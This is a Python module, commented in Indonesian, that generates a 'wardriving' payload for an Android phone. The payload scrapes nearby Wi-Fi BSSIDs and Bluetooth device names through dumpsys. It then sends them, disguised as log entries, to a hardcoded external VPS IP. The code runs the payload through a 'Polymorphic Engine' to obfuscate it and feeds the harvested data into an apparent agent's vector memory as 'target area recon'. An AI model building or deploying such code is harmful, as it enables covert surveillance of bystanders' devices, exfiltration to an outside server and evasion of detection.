"""
WARDRIVING MODULE (Fase 3B)
============================
Sistem Intelijen Pasif.
Mengubah perangkat Redmi Note 14 menjadi "Radar Bergerak" yang secara 
otomatis memetakan BSSID Wi-Fi dan perangkat Bluetooth/IoT di sekitarnya.
"""
import os, json, time, logging

log = logging.getLogger("Wardriving")

class WardrivingModule:
    INTEL_DIR = os.path.join(os.path.dirname(__file__), "..", "knowledge", "wardriving")

    @staticmethod
    def generate_android_scanner_payload() -> str:
        """
        Menghasilkan skrip Python yang dirancang untuk dieksekusi di 
        Android Node (Redmi Note 14).
        Skrip ini kemudian diubah bentuknya oleh Polymorphic Engine.
        """
        script = """
import subprocess, json, urllib.request

def scan_networks():
    intel = {"wifi": [], "bluetooth": []}
    try:
        # Pengecekan via layanan dumpsys Android (Asumsi Shizuku/Root Active)
        wifi_out = subprocess.check_output("dumpsys wifi | grep -E 'SSID|BSSID'", shell=True, timeout=5).decode(errors='replace')
        intel["wifi"] = [line.strip() for line in wifi_out.split('\\n') if line.strip()][:20]
    except: pass
    
    try:
        bt_out = subprocess.check_output("dumpsys bluetooth_manager | grep 'name:'", shell=True, timeout=5).decode(errors='replace')
        intel["bluetooth"] = [line.strip() for line in bt_out.split('\\n') if line.strip()][:20]
    except: pass

    return intel

data = scan_networks()
if data["wifi"] or data["bluetooth"]:
    req = urllib.request.Request(
        "http://"+os.environ.get("NOIR_VPS_IP", "8.215.23.17")+"/api/logs", 
        data=json.dumps({"device_id":"REDMI_RADAR", "level":"INFO", "message": f"WARDRIVE_INTEL: {json.dumps(data)}"}).encode(), 
        headers={"Content-Type": "application/json"}
    )
    try: urllib.request.urlopen(req, timeout=5)
    except: pass
"""
        try:
            from polymorphic_engine import PolymorphicEngine
            return PolymorphicEngine.mutate(script)
        except ImportError:
            log.warning("Polymorphic Engine tidak ditemukan. Menggunakan plain payload.")
            return script

    @staticmethod
    def process_incoming_intel(raw_data: str):
        """Menyerap data wardriving yang dikirim dari HP ke Vector DB VPS."""
        os.makedirs(WardrivingModule.INTEL_DIR, exist_ok=True)
        filename = os.path.join(WardrivingModule.INTEL_DIR, f"wardrive_{int(time.time())}.json")
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(raw_data)
            
            # Injeksi ke Memory
            try:
                from vector_memory import vector_memory
                vector_memory.add_experience(
                    text=f"Wardriving Intel Collected (Target Area Recon):\n{raw_data}",
                    metadata={"source": "wardriving", "type": "passive_recon"}
                )
                log.info("[WARDRIVING] Intelijen Pasif dari Redmi Note 14 berhasil diserap ke Vector Memory.")
            except: pass
        except Exception as e:
            log.error(f"[WARDRIVING] Gagal memproses intel: {e}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("--- MENGHASILKAN PAYLOAD WARDRIVING (TEROBFUSKASI) ---")
    payload = WardrivingModule.generate_android_scanner_payload()
    print(payload)
